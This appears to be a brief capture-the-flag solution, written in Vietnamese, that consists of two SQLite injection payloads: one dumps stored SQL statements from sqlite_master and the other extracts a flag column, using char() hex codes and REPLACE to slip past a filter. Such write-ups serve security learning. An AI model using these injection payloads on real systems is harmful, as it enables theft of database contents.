# Solution

Payload để dump các statement:

`(select char(0x4d,0x53,0x47,0x2d) || sql as msg from sqlite_master)`



Payload để dump flag:

`(select REPLACE(char(0x4d,0x53,0x47,0x2d)||flag,char(0x4b),char(0x76)) msg from flag)`
